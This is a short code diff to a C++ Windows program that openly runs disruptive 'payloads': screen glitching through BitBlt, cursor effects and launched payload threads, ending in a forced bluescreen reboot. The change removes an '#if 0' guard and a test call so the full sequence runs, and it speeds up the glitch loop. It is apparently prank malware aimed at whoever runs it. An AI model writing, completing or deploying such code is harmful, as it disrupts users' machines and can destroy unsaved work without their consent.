@@ -168,7 +168,7 @@ void PayloadScreenGlitch(void)
 
 		BitBlt(hdc, 0, locy, x, 1, hdc, 0 , dy(mt), SRCCOPY);
 
-		std::this_thread::sleep_for(std::chrono::seconds(15 - runtime));
+		std::this_thread::sleep_for(std::chrono::milliseconds((15 - runtime) * 50));
 	}
 }
 
@@ -270,9 +270,6 @@ void PromptToLogOut(void) {
 
 int main(void)
 {
-	runtime = 10;
-	PayloadCursor();
-#if 0
 	std::thread(PromptToLogOut).detach(); // go ahead and start fuckery, message box is just an easy way to log out early.
 	std::thread(LaunchPayloads).detach(); // said fuckery
 	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
@@ -280,5 +277,4 @@ int main(void)
 		std::this_thread::sleep_for(std::chrono::minutes(1));
 	}
 	reboot(REBOOT_BLUESCREEN);
-#endif
 }
